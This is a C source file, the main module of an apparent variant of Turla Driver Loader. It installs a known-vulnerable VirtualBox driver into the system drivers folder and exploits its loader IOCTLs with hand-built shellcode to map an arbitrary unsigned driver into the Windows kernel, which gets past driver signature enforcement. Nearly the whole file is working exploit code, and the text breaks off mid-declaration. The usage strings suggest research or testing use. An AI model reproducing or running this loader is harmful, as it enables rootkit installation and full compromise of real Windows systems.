/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2016 - 2017
*
*  TITLE:       MAIN.C
*
*  VERSION:     1.11
*
*  DATE:        20 Apr 2017
*
*  Furutaka entry point.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include <process.h>
#include "vbox.h"
#include "shellcode.h"

#pragma data_seg("shrd")
volatile LONG g_lApplicationInstances = 0;
#pragma data_seg()
#pragma comment(linker, "/Section:shrd,RWS")

HINSTANCE  g_hInstance;
HANDLE     g_ConOut = NULL;
HANDLE     g_hVBox = INVALID_HANDLE_VALUE;
BOOL       g_ConsoleOutput = FALSE;
BOOL       g_VBoxInstalled = FALSE;
WCHAR      g_BE = 0xFEFF;

ULONG      g_NtBuildNumber = 0;

#define VBoxDrvSvc      TEXT("VBoxDrv")
#define dummyDrvSvc     TEXT("dummy")
#define supImageName    "furutaka"
#define supImageHandle  0x1a000
#define PAGE_SIZE       0x1000

#define T_LOADERTITLE   TEXT("Turla Driver Loader v1.1.1 (20/04/17)")
#define T_LOADERUNSUP   TEXT("Unsupported WinNT version\r\n")
#define T_LOADERRUN     TEXT("Another instance running, close it before\r\n")
#define T_LOADERUSAGE   TEXT("Usage: loader dummy - loads simple dummy.sys driver with DriverEntry only\n \
loader createthread - loads driver which creates a thread\n \
loader openregistry - loads driver which opens a registry key for read\n \
loader openfile - loads driver which opens a file for read\n \
loader loadimage - loads driver which starts another driver legally\n \
loader original driverName.sys - loads driverName.sys driver provided by user\n")
#define T_LOADERINTRO   TEXT("Turla Driver Loader v1.1.1 started\r\n(c) 2016 - 2017 TDL Project\r\nSupported x64 OS : 7 and above\r\n")

/*
* ExtractBinResource
*
* Purpose:
*
* Extracts drivers from binary resources and saves it to file
*
*/
BOOL ExtractBinResource(const PWCHAR resourceName, const PWCHAR pathToSave)
{
    HRSRC hResource = FindResource(NULL, resourceName, L"BINARY");
    if (!hResource)
    {
        cuiPrintText(g_ConOut, TEXT("Preparation: Resource is not found"), g_ConsoleOutput, TRUE);
    }

    DWORD size = SizeofResource(NULL, hResource);
    HGLOBAL data = LoadResource(NULL, hResource);
    if (!data)
    {
        cuiPrintText(g_ConOut, TEXT("Preparation: Can't lock resource"), g_ConsoleOutput, TRUE);
    }

    HANDLE hFile = CreateFile(pathToSave
        , GENERIC_WRITE
        , 0
        , NULL
        , CREATE_NEW
        , FILE_ATTRIBUTE_NORMAL
        , NULL);
    if (!hFile)
    {
        cuiPrintText(g_ConOut, TEXT("Preparation: Cannot create file to save binary resource"), g_ConsoleOutput, TRUE);
    }

    DWORD bytesWritten = 0;
    BOOL writeResult = WriteFile(hFile, data, size, &bytesWritten, NULL);
    FreeResource(data);
    CloseHandle(hFile);
    if (!writeResult || (size != bytesWritten))
    {
        cuiPrintText(g_ConOut, TEXT("Preparation: Cannot write binary resource to file"), g_ConsoleOutput, TRUE);
    }
    return writeResult;
}

/*
* InstallHonestDriver
*
* Purpose:
*
* Installs pre-built dummy driver legally to start it from "illegal" driver later.
*
*/
BOOL InstallHonestDriver()
{
    WCHAR szTestDriverFileName[MAX_PATH * 2];
    RtlSecureZeroMemory(szTestDriverFileName, sizeof(szTestDriverFileName));
    BOOL retVal = FALSE;

    if (!GetCurrentDirectory(MAX_PATH * 2, szTestDriverFileName))
    {
        return retVal;
    }
    _strcat(szTestDriverFileName, TEXT("dummy_honestdriver.sys"));

    if (!ExtractBinResource(TEXT("honestdriver"), szTestDriverFileName)
        && !PathFileExists(szTestDriverFileName))
    {
        cuiPrintText(g_ConOut, TEXT("Preparation: Cannot extract honest driver."), g_ConsoleOutput, TRUE);
        return retVal;
    }
    
    SC_HANDLE schSCManager = NULL;
    schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!schSCManager)
    {
        cuiPrintText(g_ConOut, TEXT("Preparaion: Cannot open SC manager"), g_ConsoleOutput, FALSE);
        return retVal;
    }

    if (scmInstallDriver(schSCManager, dummyDrvSvc, szTestDriverFileName))
    {
        retVal = TRUE;
        cuiPrintText(g_ConOut, TEXT("Preparaion: Test driver has been installed"), g_ConsoleOutput, FALSE);
    }
    else
    {
        cuiPrintText(g_ConOut, TEXT("Preparaion: Installing test driver failed"), g_ConsoleOutput, FALSE);
    }

    CloseHandle(schSCManager);
    return retVal;
}

/*
* RemoveHonestDriver
*
* Purpose:
*
* Removes the legally installed driver after test is completed
*
*/
BOOL RemoveHonestDriver(_In_ SC_HANDLE schSCManager)
{
    return scmRemoveDriver(schSCManager, dummyDrvSvc);
}


/*
* TDLVBoxInstalled
*
* Purpose:
*
* Check VirtualBox software installation state.
*
*/
BOOL TDLVBoxInstalled(
    VOID
)
{
    BOOL     bPresent = FALSE;
    LRESULT  lRet;
    HKEY     hKey = NULL;

    lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("Software\\Oracle\\VirtualBox"),
        0, KEY_READ, &hKey);

    bPresent = (hKey != NULL);

    if (hKey) {
        RegCloseKey(hKey);
    }

    return bPresent;
}

/*
* TDLRelocImage
*
* Purpose:
*
* Process image relocs.
*
*/
void TDLRelocImage(
    _In_ ULONG_PTR Image,
    _In_ ULONG_PTR NewImageBase
)
{
    PIMAGE_OPTIONAL_HEADER   popth;
    PIMAGE_BASE_RELOCATION   rel;
    DWORD_PTR                delta;
    LPWORD                   chains;
    DWORD                    c, p, rsz;

    popth = &RtlImageNtHeader((PVOID)Image)->OptionalHeader;

    if (popth->NumberOfRvaAndSizes > IMAGE_DIRECTORY_ENTRY_BASERELOC)
        if (popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0)
        {
            rel = (PIMAGE_BASE_RELOCATION)((PBYTE)Image +
                popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);

            rsz = popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
            delta = (DWORD_PTR)NewImageBase - popth->ImageBase;
            c = 0;

            while (c < rsz) {
                p = sizeof(IMAGE_BASE_RELOCATION);
                chains = (LPWORD)((PBYTE)rel + p);

                while (p < rel->SizeOfBlock) {

                    switch (*chains >> 12) {
                    case IMAGE_REL_BASED_HIGHLOW:
                        *(LPDWORD)((ULONG_PTR)Image + rel->VirtualAddress + (*chains & 0x0fff)) += (DWORD)delta;
                        break;
                    case IMAGE_REL_BASED_DIR64:
                        *(PULONGLONG)((ULONG_PTR)Image + rel->VirtualAddress + (*chains & 0x0fff)) += delta;
                        break;
                    }

                    chains++;
                    p += sizeof(WORD);
                }

                c += rel->SizeOfBlock;
                rel = (PIMAGE_BASE_RELOCATION)((PBYTE)rel + rel->SizeOfBlock);
            }
        }
}

/*
* TDLGetProcAddress
*
* Purpose:
*
* Get NtOskrnl procedure address.
*
*/
ULONG_PTR TDLGetProcAddress(
    _In_ ULONG_PTR KernelBase,
    _In_ ULONG_PTR KernelImage,
    _In_ LPCSTR FunctionName
)
{
    ANSI_STRING    cStr;
    ULONG_PTR      pfn = 0;

    RtlInitString(&cStr, FunctionName);
    if (!NT_SUCCESS(LdrGetProcedureAddress((PVOID)KernelImage, &cStr, 0, (PVOID)&pfn)))
        return 0;

    return KernelBase + (pfn - KernelImage);
}

/*
* TDLResolveKernelImport
*
* Purpose:
*
* Resolve import (ntoskrnl only).
*
*/
void TDLResolveKernelImport(
    _In_ ULONG_PTR Image,
    _In_ ULONG_PTR KernelImage,
    _In_ ULONG_PTR KernelBase
)
{
    PIMAGE_OPTIONAL_HEADER      popth;
    ULONG_PTR                   ITableVA, *nextthunk;
    PIMAGE_IMPORT_DESCRIPTOR    ITable;
    PIMAGE_THUNK_DATA           pthunk;
    PIMAGE_IMPORT_BY_NAME       pname;
    ULONG                       i;

    popth = &RtlImageNtHeader((PVOID)Image)->OptionalHeader;

    if (popth->NumberOfRvaAndSizes <= IMAGE_DIRECTORY_ENTRY_IMPORT)
        return;

    ITableVA = popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
    if (ITableVA == 0)
        return;

    ITable = (PIMAGE_IMPORT_DESCRIPTOR)(Image + ITableVA);

    if (ITable->OriginalFirstThunk == 0)
        pthunk = (PIMAGE_THUNK_DATA)(Image + ITable->FirstThunk);
    else
        pthunk = (PIMAGE_THUNK_DATA)(Image + ITable->OriginalFirstThunk);

    for (i = 0; pthunk->u1.Function != 0; i++, pthunk++) {
        nextthunk = (PULONG_PTR)(Image + ITable->FirstThunk);
        if ((pthunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) == 0) {
            pname = (PIMAGE_IMPORT_BY_NAME)((PCHAR)Image + pthunk->u1.AddressOfData);
            nextthunk[i] = TDLGetProcAddress(KernelBase, KernelImage, pname->Name);
        }
        else
            nextthunk[i] = TDLGetProcAddress(KernelBase, KernelImage, (LPCSTR)(pthunk->u1.Ordinal & 0xffff));
    }
}

/*
* TDLExploit
*
* Purpose:
*
* VirtualBox exploit used by WinNT/Turla.
*
*/
void TDLExploit(
    _In_ LPVOID Shellcode,
    _In_ ULONG CodeSize,
    _In_ ULONG DataOffset
)
{
    SUPCOOKIE       Cookie;
    SUPLDROPEN      OpenLdr;
    DWORD           bytesIO = 0;
    RTR0PTR         ImageBase = NULL;
    ULONG_PTR       paramOut;
    PSUPLDRLOAD     pLoadTask = NULL;
    SUPSETVMFORFAST vmFast;
    SUPLDRFREE      ldrFree;
    SIZE_T          memIO;
    WCHAR           text[256];

    while (g_hVBox != INVALID_HANDLE_VALUE) {
        RtlSecureZeroMemory(&Cookie, sizeof(SUPCOOKIE));
        Cookie.Hdr.u32Cookie = SUPCOOKIE_INITIAL_COOKIE;
        Cookie.Hdr.cbIn = SUP_IOCTL_COOKIE_SIZE_IN;
        Cookie.Hdr.cbOut = SUP_IOCTL_COOKIE_SIZE_OUT;
        Cookie.Hdr.fFlags = SUPREQHDR_FLAGS_DEFAULT;
        Cookie.Hdr.rc = 0;
        Cookie.u.In.u32ReqVersion = 0;
        Cookie.u.In.u32MinVersion = 0x00070002;
        RtlCopyMemory(Cookie.u.In.szMagic, SUPCOOKIE_MAGIC, sizeof(SUPCOOKIE_MAGIC));

        if (!DeviceIoControl(g_hVBox, SUP_IOCTL_COOKIE,
            &Cookie, SUP_IOCTL_COOKIE_SIZE_IN, &Cookie,
            SUP_IOCTL_COOKIE_SIZE_OUT, &bytesIO, NULL))
        {
            cuiPrintText(g_ConOut, TEXT("Ldr: SUP_IOCTL_COOKIE call failed"), g_ConsoleOutput, TRUE);
            break;
        }

        RtlSecureZeroMemory(&OpenLdr, sizeof(OpenLdr));
        OpenLdr.Hdr.u32Cookie = Cookie.u.Out.u32Cookie;
        OpenLdr.Hdr.u32SessionCookie = Cookie.u.Out.u32SessionCookie;
        OpenLdr.Hdr.cbIn = SUP_IOCTL_LDR_OPEN_SIZE_IN;
        OpenLdr.Hdr.cbOut = SUP_IOCTL_LDR_OPEN_SIZE_OUT;
        OpenLdr.Hdr.fFlags = SUPREQHDR_FLAGS_DEFAULT;
        OpenLdr.Hdr.rc = 0;
        OpenLdr.u.In.cbImage = CodeSize;
        RtlCopyMemory(OpenLdr.u.In.szName, supImageName, sizeof(supImageName));

        if (!DeviceIoControl(g_hVBox, SUP_IOCTL_LDR_OPEN, &OpenLdr,
            SUP_IOCTL_LDR_OPEN_SIZE_IN, &OpenLdr,
            SUP_IOCTL_LDR_OPEN_SIZE_OUT, &bytesIO, NULL))
        {
            cuiPrintText(g_ConOut, TEXT("Ldr: SUP_IOCTL_LDR_OPEN call failed"), g_ConsoleOutput, TRUE);
            break;
        }
        else {
            _strcpy(text, TEXT("Ldr: OpenLdr.u.Out.pvImageBase = 0x"));
            u64tohex((ULONG_PTR)OpenLdr.u.Out.pvImageBase, _strend(text));
            cuiPrintText(g_ConOut, text, g_ConsoleOutput, TRUE);
        }

        ImageBase = OpenLdr.u.Out.pvImageBase;

        memIO = PAGE_SIZE + CodeSize;
        NtAllocateVirtualMemory(NtCurrentProcess(), &pLoadTask, 0, &memIO,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

        if (pLoadTask == NULL)
            break;

        pLoadTask->Hdr.u32Cookie = Cookie.u.Out.u32Cookie;
        pLoadTask->Hdr.u32SessionCookie = Cookie.u.Out.u32SessionCookie;
        pLoadTask->Hdr.cbIn =
            (ULONG_PTR)(&((PSUPLDRLOAD)0)->u.In.achImage) + CodeSize;
        pLoadTask->Hdr.cbOut = SUP_IOCTL_LDR_LOAD_SIZE_OUT;
        pLoadTask->Hdr.fFlags = SUPREQHDR_FLAGS_MAGIC;
        pLoadTask->Hdr.rc = 0;
        pLoadTask->u.In.eEPType = SUPLDRLOADEP_VMMR0;
        pLoadTask->u.In.pvImageBase = ImageBase;
        pLoadTask->u.In.EP.VMMR0.pvVMMR0 = (RTR0PTR)supImageHandle;
        pLoadTask->u.In.EP.VMMR0.pvVMMR0EntryEx = ImageBase;
        pLoadTask->u.In.EP.VMMR0.pvVMMR0EntryFast = ImageBase;
        pLoadTask->u.In.EP.VMMR0.pvVMMR0EntryInt = ImageBase;
        RtlCopyMemory(pLoadTask->u.In.achImage, Shellcode, CodeSize);
        pLoadTask->u.In.cbImage = CodeSize;

        if (!DeviceIoControl(g_hVBox, SUP_IOCTL_LDR_LOAD,
            pLoadTask, pLoadTask->Hdr.cbIn,
            pLoadTask, SUP_IOCTL_LDR_LOAD_SIZE_OUT, &bytesIO, NULL))
        {
            cuiPrintText(g_ConOut, TEXT("Ldr: SUP_IOCTL_LDR_LOAD call failed"), g_ConsoleOutput, TRUE);
            break;
        }
        else {
            _strcpy(text, TEXT("Ldr: SUP_IOCTL_LDR_LOAD, success\r\n\tShellcode mapped at 0x"));
            u64tohex((ULONG_PTR)ImageBase, _strend(text));
            _strcat(text, TEXT(", size = 0x"));
            ultohex(CodeSize, _strend(text));

            _strcat(text, TEXT("\r\n\tDriver image mapped at 0x"));
            u64tohex((ULONG_PTR)ImageBase + DataOffset, _strend(text));
            cuiPrintText(g_ConOut, text, g_ConsoleOutput, TRUE);
        }

        RtlSecureZeroMemory(&vmFast, sizeof(vmFast));
        vmFast.Hdr.u32Cookie = Cookie.u.Out.u32Cookie;
        vmFast.Hdr.u32SessionCookie = Cookie.u.Out.u32SessionCookie;
        vmFast.Hdr.rc = 0;
        vmFast.Hdr.fFlags = SUPREQHDR_FLAGS_DEFAULT;
        vmFast.Hdr.cbIn = SUP_IOCTL_SET_VM_FOR_FAST_SIZE_IN;
        vmFast.Hdr.cbOut = SUP_IOCTL_SET_VM_FOR_FAST_SIZE_OUT;
        vmFast.u.In.pVMR0 = (LPVOID)supImageHandle;

        if (!DeviceIoControl(g_hVBox, SUP_IOCTL_SET_VM_FOR_FAST,
            &vmFast, SUP_IOCTL_SET_VM_FOR_FAST_SIZE_IN,
            &vmFast, SUP_IOCTL_SET_VM_FOR_FAST_SIZE_OUT, &bytesIO, NULL))
        {
            cuiPrintText(g_ConOut, TEXT("Ldr: SUP_IOCTL_SET_VM_FOR_FAST call failed"), g_ConsoleOutput, TRUE);
            break;
        }
        else {
            cuiPrintText(g_ConOut, TEXT("Ldr: SUP_IOCTL_SET_VM_FOR_FAST call complete"), g_ConsoleOutput, TRUE);
        }

        cuiPrintText(g_ConOut, TEXT("Ldr: SUP_IOCTL_FAST_DO_NOP"), g_ConsoleOutput, TRUE);

        paramOut = 0;
        DeviceIoControl(g_hVBox, SUP_IOCTL_FAST_DO_NOP,
            NULL, 0,
            &paramOut, sizeof(paramOut), &bytesIO, NULL);

        cuiPrintText(g_ConOut, TEXT("Ldr: SUP_IOCTL_LDR_FREE"), g_ConsoleOutput, TRUE);

        RtlSecureZeroMemory(&ldrFree, sizeof(ldrFree));
        ldrFree.Hdr.u32Cookie = Cookie.u.Out.u32Cookie;
        ldrFree.Hdr.u32SessionCookie = Cookie.u.Out.u32SessionCookie;
        ldrFree.Hdr.cbIn = SUP_IOCTL_LDR_FREE_SIZE_IN;
        ldrFree.Hdr.cbOut = SUP_IOCTL_LDR_FREE_SIZE_OUT;
        ldrFree.Hdr.fFlags = SUPREQHDR_FLAGS_DEFAULT;
        ldrFree.Hdr.rc = 0;
        ldrFree.u.In.pvImageBase = ImageBase;

        DeviceIoControl(g_hVBox, SUP_IOCTL_LDR_FREE,
            &ldrFree, SUP_IOCTL_LDR_FREE_SIZE_IN,
            &ldrFree, SUP_IOCTL_LDR_FREE_SIZE_OUT, &bytesIO, NULL);

        break;
    }

    if (pLoadTask != NULL) {
        memIO = 0;
        NtFreeVirtualMemory(NtCurrentProcess(), &pLoadTask, &memIO, MEM_RELEASE);
    }

    if (g_hVBox != INVALID_HANDLE_VALUE) {
        CloseHandle(g_hVBox);
        g_hVBox = INVALID_HANDLE_VALUE;
    }
}

/*
* TDLMapDriver
*
* Purpose:
*
* Build shellcode and execute exploit.
*
*/
UINT TDLMapDriver(
    _In_ LPWSTR lpDriverFullName
)
{
    UINT               result = (UINT)-1;
    ULONG              isz, prologueSize, dataOffset;
    SIZE_T             memIO;
    ULONG_PTR          KernelBase, KernelImage = 0;
    ULONG_PTR          xExAllocatePoolWithTag = 0, xPsCreateSystemThread = 0, xZwClose = 0;
    HMODULE            Image = NULL;
    PIMAGE_NT_HEADERS  FileHeader;
    PBYTE              Buffer = NULL;
    UNICODE_STRING     uStr;
    ANSI_STRING        routineName;
    NTSTATUS           status;
    WCHAR              text[256];

    KernelBase = supGetNtOsBase();
    while (KernelBase != 0) {

        _strcpy(text, TEXT("Ldr: Kernel base = 0x"));
        u64tohex(KernelBase, _strend(text));
        cuiPrintText(g_ConOut, text, g_ConsoleOutput, TRUE);

        RtlSecureZeroMemory(&uStr, sizeof(uStr));
        RtlInitUnicodeString(&uStr, lpDriverFullName);
        status = LdrLoadDll(NULL, NULL, &uStr, (PVOID)&Image);
        if ((!NT_SUCCESS(status)) || (Image == NULL)) {
            cuiPrintText(g_ConOut, TEXT("Ldr: Error while loading input driver file"), g_ConsoleOutput, TRUE);
            break;
        }
        else {
            _strcpy(text, TEXT("Ldr: Input driver file loaded at 0x"));
            u64tohex((ULONG_PTR)Image, _strend(text));
            cuiPrintText(g_ConOut, text, g_ConsoleOutput, TRUE);
        }

        FileHeader = RtlImageNtHeader(Image);
        if (FileHeader == NULL)
            break;

        isz = FileHeader->OptionalHeader.SizeOfImage;

        cuiPrintText(g_ConOut, TEXT("Ldr: Loading ntoskrnl.exe"), g_ConsoleOutput, TRUE);

        RtlInitUnicodeString(&uStr, L"ntoskrnl.exe");
        status = LdrLoadDll(NULL, NULL, &uStr, (PVOID)&KernelImage);
        if ((!NT_SUCCESS(status)) || (KernelImage == 0)) {
            cuiPrintText(g_ConOut, TEXT("Ldr: Error while loading ntoskrnl.exe"), g_ConsoleOutput, TRUE);
            break;
        }
        else {
            _strcpy(text, TEXT("Ldr: ntoskrnl.exe loaded at 0x"));
            u64tohex(KernelImage, _strend(text));
            cuiPrintText(g_ConOut, text, g_ConsoleOutput, TRUE);
        }

        RtlInitString(&routineName, "ExAllocatePoolWithTag");
        status = LdrGetProcedureAddress((PVOID)KernelImage, &routineName, 0, (PVOID)&xExAllocatePoolWithTag);
        if ((!NT_SUCCESS(status)) || (xExAllocatePoolWithTag == 0)) {
            cuiPrintText(g_ConOut, TEXT("Ldr: Error, ExAllocatePoolWithTag address not found"), g_ConsoleOutput, TRUE);
            break;
        }
        else {
            _strcpy(text, TEXT("Ldr: ExAllocatePoolWithTag 0x"));
            u64tohex(KernelBase + (xExAllocatePoolWithTag - KernelImage), _strend(text));
            cuiPrintText(g_ConOut, text, g_ConsoleOutput, TRUE);
        }

        if (g_NtBuildNumber < 15063) {
            RtlInitString(&routineName, "PsCreateSystemThread");
            status = LdrGetProcedureAddress((PVOID)KernelImage, &routineName, 0, (PVOID)&xPsCreateSystemThread);
            if ((!NT_SUCCESS(status)) || (xPsCreateSystemThread == 0)) {
                cuiPrintText(g_ConOut, TEXT("Ldr: Error, PsCreateSystemThread address not found"), g_ConsoleOutput, TRUE);
                break;
            }
            else {
                _strcpy(text, TEXT("Ldr: PsCreateSystemThread 0x"));
                u64tohex(KernelBase + (xPsCreateSystemThread - KernelImage), _strend(text));
                cuiPrintText(g_ConOut, text, g_ConsoleOutput, TRUE);
            }

            RtlInitString(&routineName, "ZwClose");
            status = LdrGetProcedureAddress((PVOID)KernelImage, &routineName, 0, (PVOID)&xZwClose);
            if ((!NT_SUCCESS(status)) || (xZwClose == 0)) {
                cuiPrintText(g_ConOut, TEXT("Ldr: Error, ZwClose address not found"), g_ConsoleOutput, TRUE);
                break;
            }
            else {
                _strcpy(text, TEXT("Ldr: ZwClose 0x"));
                u64tohex(KernelBase + (xZwClose - KernelImage), _strend(text));
                cuiPrintText(g_ConOut, text, g_ConsoleOutput, TRUE);
            }
        }

        memIO = isz + PAGE_SIZE;
        NtAllocateVirtualMemory(NtCurrentProcess(), (PVOID)&Buffer, 0, &memIO,
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (Buffer == NULL) {
            cuiPrintText(g_ConOut, TEXT("Ldr: Error, unable to allocate shellcode"), g_ConsoleOutput, TRUE);
            break;
        }
        else {
            _strcpy(text, TEXT("Ldr: Shellcode allocated at 0x"));
            u64tohex((ULONG_PTR)Buffer, _strend(text));
            cuiPrintText(g_ConOut, text, g_ConsoleOutput, TRUE);
        }

        // mov rcx, ExAllocatePoolWithTag
        // mov rdx, PsCreateSystemThread
        // mov r8, ZwClose

        Buffer[0x00] = 0x48; // mov rcx, xxxxx
        Buffer[0x01] = 0xb9;
        *((PULONG_PTR)&Buffer[2]) =
            KernelBase + (xExAllocatePoolWithTag - KernelImage);

        if (g_NtBuildNumber < 15063) {
            Buffer[0x0a] = 0x48; // mov rdx, xxxxx
            Buffer[0x0b] = 0xba;
            *((PULONG_PTR)&Buffer[0x0c]) =
                KernelBase + (xPsCreateSystemThread - KernelImage);
            Buffer[0x14] = 0x49; //mov r8, xxxxx
            Buffer[0x15] = 0xb8;
            *((PULONG_PTR)&Buffer[0x16]) =
                KernelBase + (xZwClose - KernelImage);

            prologueSize = 0x1e;
        }
        else {
            prologueSize = 0x0a;
        }

        dataOffset = prologueSize + MAX_SHELLCODE_LENGTH;

        if (g_NtBuildNumber < 15063) {
            RtlCopyMemory(Buffer + prologueSize,
                TDLBootstrapLoader_code, sizeof(TDLBootstrapLoader_code));
            cuiPrintText(g_ConOut, TEXT("Ldr: Default bootstrap shellcode selected"), g_ConsoleOutput, TRUE);
        }
        else {
            RtlCopyMemory(Buffer + prologueSize,
                TDLBootstrapLoader_code_w10rs2, sizeof(TDLBootstrapLoader_code_w10rs2));
            cuiPrintText(g_ConOut, TEXT("Ldr: Windows 10 RS2+ bootstrap shellcode selected"), g_ConsoleOutput, TRUE);
        }

        RtlCopyMemory(Buffer + dataOffset, Image, isz);

        cuiPrintText(g_ConOut, TEXT("Ldr: Resolving kernel import"), g_ConsoleOutput, TRUE);
        TDLResolveKernelImport((ULONG_PTR)Buffer + dataOffset, KernelImage, KernelBase);

        cuiPrintText(g_ConOut, TEXT("Ldr: Executing exploit"), g_ConsoleOutput, TRUE);
        TDLExploit(Buffer, isz + PAGE_SIZE, dataOffset);
        result = 0;
        break;
    }

    if (Buffer != NULL) {
        memIO = 0;
        NtFreeVirtualMemory(NtCurrentProcess(), &Buffer, &memIO, MEM_RELEASE);
    }

    return result;
}

/*
* TDLStartVulnerableDriver
*
* Purpose:
*
* Load vulnerable virtualbox driver and return handle for it device.
*
*/
HANDLE TDLStartVulnerableDriver(
    VOID
)
{
    PBYTE       DrvBuffer;
    ULONG       DataSize = 0, bytesIO;
    HANDLE      hDevice = INVALID_HANDLE_VALUE;
    WCHAR       szDriverFileName[MAX_PATH * 2];
    SC_HANDLE   schSCManager = NULL;
    LPWSTR      msg;

    DrvBuffer = supQueryResourceData(1, g_hInstance, &DataSize);
    while (DrvBuffer != NULL) {

        //lets give scm nice looking path so this piece of shit code from early 90x wont fuckup somewhere.
        RtlSecureZeroMemory(szDriverFileName, sizeof(szDriverFileName));
        if (!GetSystemDirectory(szDriverFileName, MAX_PATH)) {

            cuiPrintText(g_ConOut,
                TEXT("Ldr: Error loading VirtualBox driver, GetSystemDirectory failed"),
                g_ConsoleOutput, TRUE);

            break;
        }

        schSCManager = OpenSCManager(NULL,
            NULL,
            SC_MANAGER_ALL_ACCESS
        );
        if (schSCManager == NULL) {
            cuiPrintText(g_ConOut,
                TEXT("Ldr: Error opening SCM database"),
                g_ConsoleOutput, TRUE);

            break;
        }

        //lookup main vbox driver device, if found, try to unload all possible, unload order is sensitive
        if (supIsObjectExists(L"\\Device", L"VBoxDrv")) {
            cuiPrintText(g_ConOut,
                TEXT("Ldr: Active VirtualBox found in system, attempt unload it"),
                g_ConsoleOutput, TRUE);

            if (scmStopDriver(schSCManager, TEXT("VBoxNetAdp"))) {
                cuiPrintText(g_ConOut,
                    TEXT("SCM: VBoxNetAdp driver unloaded"),
                    g_ConsoleOutput, TRUE);
            }
            if (scmStopDriver(schSCManager, TEXT("VBoxNetLwf"))) {
                cuiPrintText(g_ConOut,
                    TEXT("SCM: VBoxNetLwf driver unloaded"),
                    g_ConsoleOutput, TRUE);
            }
            if (scmStopDriver(schSCManager, TEXT("VBoxUSBMon"))) {
                cuiPrintText(g_ConOut,
                    TEXT("SCM: VBoxUSBMon driver unloaded"),
                    g_ConsoleOutput, TRUE);
            }
            Sleep(1000);
            if (scmStopDriver(schSCManager, TEXT("VBoxDrv"))) {
                cuiPrintText(g_ConOut,
                    TEXT("SCM: VBoxDrv driver unloaded"),
                    g_ConsoleOutput, TRUE);
            }
        }

        //
        // If vbox installed backup it driver, do it before dropping our
        // Ignore error if file not found
        //
        if (g_VBoxInstalled) {
            if (supBackupVBoxDrv(FALSE) == FALSE) {
                cuiPrintText(g_ConOut,
                    TEXT("Ldr: Error while doing VirtualBox driver backup"),
                    g_ConsoleOutput, TRUE);
            }
        }

        //drop our vboxdrv version
        _strcat(szDriverFileName, TEXT("\\drivers\\VBoxDrv.sys"));
        bytesIO = (ULONG)supWriteBufferToFile(szDriverFileName, DrvBuffer,
            (SIZE_T)DataSize, FALSE, FALSE);

        if (bytesIO != DataSize) {

            cuiPrintText(g_ConOut,
                TEXT("Ldr: Error writing VirtualBox on disk"),
                g_ConsoleOutput, TRUE);

            break;
        }

        //if vbox not found in system install driver in scm
        if (g_VBoxInstalled == FALSE) {
            scmInstallDriver(schSCManager, VBoxDrvSvc, szDriverFileName);
        }

        //run driver
        if (scmStartDriver(schSCManager, VBoxDrvSvc) != FALSE) {

            if (scmOpenDevice(VBoxDrvSvc, &hDevice))
                msg = TEXT("SCM: Vulnerable driver loaded and opened");
            else
                msg = TEXT("SCM: Driver device open failure");

        }
        else {
            msg = TEXT("SCM: Vulnerable driver load failure");
        }

        cuiPrintText(g_ConOut, msg, g_ConsoleOutput, TRUE);
        break;
    }

    //post cleanup
    if (schSCManager != NULL) {
        CloseServiceHandle(schSCManager);
    }
    return hDevice;
}

/*
* TDLStopVulnerableDriver
*
* Purpose:
*
* Unload previously loaded vulnerable driver. If VirtualBox installed - restore original driver.
*
*/
void TDLStopVulnerableDriver(
    VOID
)
{
    SC_HANDLE	       schSCManager;
    LPWSTR             msg;
    UNICODE_STRING     uStr;
    OBJECT_ATTRIBUTES  ObjectAttributes;

    cuiPrintText(g_ConOut,
        TEXT("SCM: Unloading vulnerable driver"),
        g_ConsoleOutput, TRUE);

    if (g_hVBox != INVALID_HANDLE_VALUE)
        CloseHandle(g_hVBox);

    schSCManager = OpenSCManager(NULL,
        NULL,
        SC_MANAGER_ALL_ACCESS
    );

    if (schSCManager == NULL) {
        cuiPrintText(g_ConOut,
            TEXT("SCM: Cannot open database, unable unload driver"),
            g_ConsoleOutput, TRUE);
        return;
    }

    //stop driver in any case
    if (scmStopDriver(schSCManager, VBoxDrvSvc))
        msg = TEXT("SCM: Vulnerable driver successfully unloaded");
    else
        msg = TEXT("SCM: Unexpected error while unloading driver");

    cuiPrintText(g_ConOut, msg, g_ConsoleOutput, TRUE);

    //if VBox not installed - remove from scm database and delete file
    if (g_VBoxInstalled == FALSE) {

        if (scmRemoveDriver(schSCManager, VBoxDrvSvc))
            msg = TEXT("SCM: Driver entry removed from registry");
        else
            msg = TEXT("SCM: Error removing driver entry from registry");

        cuiPrintText(g_ConOut, msg, g_ConsoleOutput, TRUE);

        uStr.Buffer = NULL;
        uStr.Length = 0;
        uStr.MaximumLength = 0;
        RtlInitUnicodeString(&uStr, L"\\??\\globalroot\\systemroot\\system32\\drivers\\VBoxDrv.sys");
        InitializeObjectAttributes(&ObjectAttributes, &uStr, OBJ_CASE_INSENSITIVE, NULL, NULL);
        if (NT_SUCCESS(NtDeleteFile(&ObjectAttributes)))
            msg = TEXT("Ldr: Driver file removed");
        else
            msg = TEXT("Ldr: Error removing driver file");

        cuiPrintText(g_ConOut, msg, g_ConsoleOutput, TRUE);

    }
    else {
        //VBox software present, restore original driver and exit
        if (supBackupVBoxDrv(TRUE))
            msg = TEXT("Ldr: Original driver restored");
        else
            msg = TEXT("Ldr: Unexpected error while restoring original driver");

        cuiPrintText(g_ConOut, msg, g_ConsoleOutput, TRUE);
    }
    CloseServiceHandle(schSCManager);
}


/*
* GetTextParameter
*
* Purpose:
*
* Extract test name from command line.
*
*/
BOOL GetTextParameter(_In_ LPWSTR lpCommandLine, ULONG index, WCHAR* buf, ULONG bufSize)
